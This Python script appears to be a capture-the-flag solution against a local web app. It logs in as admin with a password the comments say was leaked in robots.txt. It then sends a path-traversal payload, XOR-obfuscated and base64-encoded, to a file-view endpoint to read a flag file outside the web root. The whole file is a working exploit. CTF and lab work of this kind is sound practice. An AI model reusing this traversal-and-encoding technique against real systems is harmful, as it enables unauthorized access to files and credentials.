import base64
import requests

# Configuration
BASE_URL = "http://localhost:8002"
LOGIN_URL = f"{BASE_URL}/login"
VIEW_URL = f"{BASE_URL}/view"

# Credentials from robots.txt
USERNAME = "admin"
PASSWORD = "Arch1ve_Adm1n_P4ss!"
XOR_KEY = 0x42

# Target
TARGET_PATH = "../../tmp/the_real_flag.txt"

def pwn():
    # Use a session object to persist cookies (like a browser does)
    session = requests.Session()

    print(f"[*] Attempting login as '{USERNAME}'...")
    login_data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    
    # 1. Login to get the session cookie
    response = session.post(LOGIN_URL, data=login_data)
    
    if response.status_code == 200 or "dashboard" in response.url:
        print("[+] Login Successful! Session cookie acquired.")
    else:
        print("[!] Login failed. Check credentials or server status.")
        return

    # 2. Generate the XOR + Base64 payload
    print(f"[*] Crafting payload for: {TARGET_PATH}")
    xor_path = ''.join([chr(ord(c) ^ XOR_KEY) for c in TARGET_PATH])
    payload = base64.b64encode(xor_path.encode()).decode()
    
    # 3. Request the flag
    print(f"[*] Sending exploit payload: {payload}")
    exploit_url = f"{VIEW_URL}?file={payload}"
    flag_response = session.get(exploit_url)

    if flag_response.status_code == 200:
        print("\n" + "="*40)
        print(f"FLAG: {flag_response.text.strip()}")
        print("="*40)
    else:
        print(f"[!] Exploit failed with status: {flag_response.status_code}")
        print(f"Response: {flag_response.text}")

if __name__ == "__main__":
    pwn()
